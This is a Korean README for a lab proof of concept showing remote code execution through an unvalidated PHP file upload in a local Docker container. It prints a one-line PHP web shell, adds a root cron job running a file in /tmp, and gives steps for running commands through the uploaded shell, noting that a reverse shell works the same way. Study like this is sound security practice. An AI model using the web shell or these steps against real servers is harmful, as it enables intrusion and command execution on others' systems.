# 1. RCE (File Upload) 취약점 이란?

파일 업로드 취약점은 서버가 업로드된 파일에 대해 충분한 검증 없이 저장 및 실행하도록 허용하는 보안 문제로써 공격자는 악성 파일을 업로드하여 원격 명령 실행, 리버스 쉘 획득 등 다양한 공격을 수행할 수 있습니다

# 2. PoC 개요

본 PoC는 파일 업로드 취약점을 이용해 RCE를 재현합니다.

공격자가 악성 PHP 웹쉘을 업로드하고 이를 실행하여 서버에서 임의 명령어를 실행할 수 있음을 실습 환경에서 확인할 수 있습니다.

# 3. PoC 환경 구성

- 언어 및 프레임워크 : PHP 8.2 (내장 웹서버 사용)
- PoC 구성
    - `upload.php`: 파일 업로드 및 실행 가능한 PHP 웹쉘 포함
    - `Dockerfile`: 도커 이미지 생성용 설정
- Docker 환경
    - Docker 이미지 빌드 후 컨테이너 실행 시 PHP 내장 웹서버가 0.0.0.0:8080 포트에서 실행
    - 업로드 파일은 uploads/ 폴더에 원본 파일명으로 저장 (검증 및 난독화 미실시)

# 4. PoC 실행 방법

1. Docker 이미지 가져오기
    
    ```bash
    $ docker pull dukbong/poc:2025-06-fileupload
    ```
    
2. Docker 컨테이너 실행
    
    ```bash
    docker run --name fileupload -p 8080:8080 dukbong/poc:2025-06-fileupload
    ```

3. Docker 환경 구성 ( 다양한 취약점을 위한 구성 )

    1. root 권한으로 접속
    ```bash
    docker exec -it --user root fileupload /bin/bash
    ```
    2. root 권한으로 cron 작성
    ```bash
    vi /etc/cron.d/fileupload

    * * * * * root /tmp/fileupload
    ```
    3. 권한 설설정
    ```bash
    chmode 744 /etc/cron.d/fileupload
    ```
    4. cron 재시작
    ```bash
    service cron restart
    ```
    
4. 웹 애플리케이션 접속
    
    ```bash
    http://localhost:8080
    ```
    
5. 주요 엔드포인트
    
    | 경로 | 설명 | 메소드 | 비고 |
    | --- | --- | --- | --- |
    | / | 파일 업로드 페이지 | GET, POST | 취약점 시연 대상 |
    | /uploads/{file_name} | 파일 경로 | GET | 취약점 시연 대상 |

6. 악성 코드
    
    ```php
    <?php
        system($_GET['cmd']);
    ?>
    ```

# 5. 재현 절차

1. 웹 페이지 접속 후 임의의 PHP 웹쉘 파일 (예: `shell.php`) 업로드 합니다.
2. 업로드 성공 후 `/uploads/shell.php?cmd=id` 형태로 접근합니다.
3. 서버에서 명령어가 실행되어 결과가 출력됨을 확인합니다.
4. 리버스 쉘 페이로드도 동일 방식으로 업로드 후 실행 가능합니다.

# 6. 느낀점 및 기술적 이해
